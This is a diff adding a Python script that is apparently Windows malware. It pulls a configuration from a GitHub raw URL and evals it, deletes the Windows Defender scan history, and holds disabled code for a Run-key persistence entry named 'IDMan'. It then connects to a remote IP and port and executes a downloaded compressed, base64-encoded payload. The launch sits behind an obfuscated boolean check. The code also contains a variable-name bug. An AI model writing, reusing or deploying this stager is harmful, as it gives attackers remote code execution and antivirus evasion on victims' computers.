@@ -1,0 +1,130 @@
+import threading
+import sys
+import code
+import platform
+import shutil
+
+import os
+import subprocess
+import getpass
+import socket
+
+import zlib
+import base64
+import struct
+import time
+
+import codecs
+import winreg
+import random
+
+import urllib.request
+
+import imp
+
+#import tkinter
+#import pyscreeze
+#import pygame
+#import numpy
+#import scipy
+
+# https://stackoverflow.com/questions/15128225/python-script-to-read-and-write-a-path-to-registry
+
+class MSPM():
+    def __init__(self):
+        self.Github_Link = "https://raw.githubusercontent.com/vektorX9119/AftBR/main/aftbr" # https://raw.githubusercontent.com/vektorX9119/TRNEW/main/ttnew
+        self.L = urllib.request.urlopen(self.Github_Link)
+        self.CB = self.L.read()
+        self.CS = self.CB.decode()
+        self.Config_Dict = eval(self.CS)
+
+        self.Reg_Name = "IDMan"
+
+        self.system_drive = os.getenv("SystemDrive")
+        self.user = getpass.getuser()
+        self.Final_Location = os.path.dirname(sys.argv[0]).replace("/", "\\") + "\\" + os.path.basename(sys.argv[0])
+        time.sleep(40)
+        try:
+            shutil.rmtree(r"C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service")
+        except:
+            pass
+
+        self.MSPM_Main()
+
+        self.Used_List = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+
+
+    def RTA(self,myExe_path):
+        try:
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {} /t REG_SZ /d "'.format(self.Reg_Name) + myExe_path + '"', shell=True)
+        except:
+            pass
+
+    def Checker(self,name):
+
+        REG_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        try:
+            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
+            value, regtype = winreg.QueryValueEx(registry_key, name)
+            winreg.CloseKey(registry_key)
+            return True
+            #return value
+        except WindowsError:
+            return False
+            #return None
+
+    def __MSPM(self):
+        """for x in range(40320):  # 40320 * 15 = 604800 sec ---> One Week ----> range ==>40320
+            try:
+                s = socket.socket(2, socket.SOCK_STREAM)
+                s.connect((Config_Dict['IP'], Config_Dict['PORT']))
+                break
+            except:
+                time.sleep(15)"""
+        time.sleep(8)
+        for x in range(40320):  # 40320
+            try:
+                Z = socket.socket(2, socket.SOCK_STREAM)
+                Z.connect((self.Config_Dict['IP'], self.Config_Dict['PORT']))
+                # print("Connected")
+                DD = struct.unpack('>I', Z.recv(4))[0]
+                time.sleep(9)
+                break
+            except:
+                # print("Failed to Connect")
+                time.sleep(11)
+        dd = Z.recv(DD)
+        time.sleep(7)
+        while len(d) < DD:
+            dd += Z.recv(DD - len(dd))
+        time.sleep(12)
+        exec(zlib.decompress(base64.b64decode(dd)), {'s': Z})
+
+    def MSPM_Main(self):
+        try:
+            time.sleep(13)
+            # RTA(Final_Location)
+            if (self.Checker(name=self.Reg_Name)):
+                pass
+            else:
+                pass
+                #self.RTA(myExe_path=self.Final_Location)
+        except:
+            pass
+        try:
+            time.sleep(7)
+            self.__MSPM()
+        except:
+            pass
+
+
+Logic = not (False or False)
+Logic += not (False or True)
+Logic += not (True and False)
+Logic += not (True and False)
+if Logic == 0:
+    pass
+elif Logic == 3:
+    pass
+if Logic == 3:
+    exec("MSPM()")
